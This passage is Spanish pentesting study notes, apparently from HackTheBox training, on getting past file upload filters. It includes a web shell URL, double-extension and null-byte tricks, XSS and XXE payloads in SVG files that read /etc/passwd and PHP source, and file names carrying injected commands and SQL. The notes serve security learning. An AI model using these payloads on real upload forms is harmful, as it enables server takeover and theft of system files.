
http://caca.com/uploads/shell.php?cmd=id

## Blacklist filters

Cuando hay una validación de la extensión en el backend donde compara la extensión del archivo con una serie de extensiones de su blacklist

PASOS PARA BYPASSEARLO

1. Fuzzear extensiones y ver cuales están en la blacklist y cuales no
2. Probas a subir shells con las extensiones que te deja para ver si alguna ejecuta la shell

## Whitelist filters

Cuando hay una lista de extensiones que SI deja utilizar

1.Si comprueba que existe una extension de la whitelist en el archivo sin comprobar que es la última extension

 En estos casos usamos las extensiones dobles ,Ej:
 `ejemplo.jpg.php` -> en este caso bypasseamos el filtro porque la web 
 comprueba que el .jpg está 

2.Cuando comprueba la última extensión
 En este caso invertimos las extensiones para que bypasseemos la whitelist 
 pero eso puede no ser suficiente porque el que se ejecute el php o no       
 depende de como este configurado el servidor, esto lo sabremos mejor 
 si el servidor es un open source y podemos ver como trata las extensiones

### Character injection

Se puede jugar con php para que interprete de manera errónea las extensiones con carácteres:
- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`
El `%00` sirve para versiones de PHP 5.X y anteriores , es el null byte y nos sirve para bypassear el filtro de forma que luego se guarde sin la extensión de detrás del null byte. Ej: `shell.php%00.jpg -> shell.php`

En servidores windows pasa lo mismo pero con `:`  Ej: `shell.php:.jpg -> shell.php`  no es con php si no con cualquier extensión

## Type filters

En este caso no validan la extensión como en los casos anteriores sino que validan el contenido del archivo , los casos más comunes son `Content-Type Header` y `File Content`

Esto se nota cuando los bypasses anteriores no nos funcionan y tampoco subir una shell que se llame shell.png ,si la extension png está autorizada y todavía nos da error puede ser porque la web compruebe también el contenido del archivo asi que simplemente cambia el content-type a lo que te deje

## MIME-Type

En este caso se comprueban los llamados Magic Bytes, por ejemplo si un archivo empieza con `GIF87a` entonces es porque es un GIF y esos bytes son los que comprueba la app para ver si tu archivo es adecaudo

## Concatenar con otras vulnerabilidades 

A veces la web está bien protegida ante los ataques vistos anteriormente pero puede ser que a través de una upload podamos agregar a la web una vulnerabilidad nueva 

### XSS

-Subir archivos html que exploten stored XSS

-Cuando una web además de guardar la foto la enseña sus metadatos:
```shell-session
bonack@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```
También puede ser que si de la foto le quitamos los Magic Bytes la web interprete la imagen como texto y por ende que eneseñe el XSS sin necesidad de que se vean explicitamente los metadatos

-Si te deja meterle .svg como imagen podríamos explotar XSS cada vez que  se muestre la foto : 
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

### XXE

-Para mostrar /etc/passwd (hay que usar extensión .svg)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
-Para leer el código fuente:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

### DoS
## Command injection

si subimos un archivo que en el nombre tiene un comando y el nombre del archivo entero es ejecutado en un OS puede dar un command injection

`file$(whoami).jpg` 
``file`whoami`.jpg`` 
`file.jpg||whoami`

lo mismo se aplica con XSS y SQLi : `file';select+sleep(5);--.jpg`
